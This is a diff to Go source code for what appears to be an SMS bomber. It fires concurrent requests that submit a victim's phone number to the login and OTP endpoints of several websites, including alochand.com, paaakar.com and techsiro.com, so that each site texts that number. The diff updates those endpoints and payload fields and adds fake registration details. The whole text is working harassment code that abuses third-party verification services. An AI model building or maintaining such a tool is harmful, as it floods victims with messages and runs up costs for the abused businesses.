@@ -856,18 +856,18 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
 			}
 		}(client) 
-
+///////////////////////////////////////////////////////////////////////////////////
 		// api-atlasmode.alochand.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
-				formData.Set("version", "new2")
+				formData.Set("version", "new1")
 				formData.Set("mobile", phone)
-				formData.Set("sdlkjcvisl", "uikjdknfs")
-				sendFormRequest(c, ctx, "https://api-atlasmode.alochand.com/v1/customer/register-login?version=new2", formData, &wg, ch) // ارسال c
+				sendFormRequest(c, ctx, "https://api.alochand.com/v1/customer/register-login?version=new1", formData, &wg, ch) 
 			}
 		}(client)
+
 		// api.pashikshoes.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -886,32 +886,18 @@ cookieJar, _ := cookiejar.New(nil)
 				formData := url.Values{}
 				formData.Set("version", "new1")
 				formData.Set("mobile", phone)
-				formData.Set("sdlkjcvisl", "uikjdknfs")
 				sendFormRequest(c, ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch) 
 			}
 		}(client)
 
-		// queenaccessories.ir (SMS - POST JSON)
-		wg.Add(1)
+		// techsiro.com (SMS - POST Form)
+ 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
 				payload := map[string]interface{}{
-					"mobile_phone": phone,
+					"user_number": phone,
 				}
-				sendJSONRequest(c, ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
-			}
-		}(client) 
-
-		// techsiro.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("client", "web")
-				formData.Set("method", "POST")
-				formData.Set("_token", "")
-				formData.Set("mobile", phone)
-				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) 
+				sendJSONRequest(c, ctx, "https://api.techsiro.com/auth/generate-verification-code/", payload, &wg, ch) 
 			}
 		}(client) 
 
@@ -920,8 +906,8 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"firstName": "Test", 
-					"lastName": "User", 
+					"firstName": "users", 
+					"lastName": "names", 
 					"mobile": phone, 
 					"password": "testpassword123", 
 					"platform": "web", 
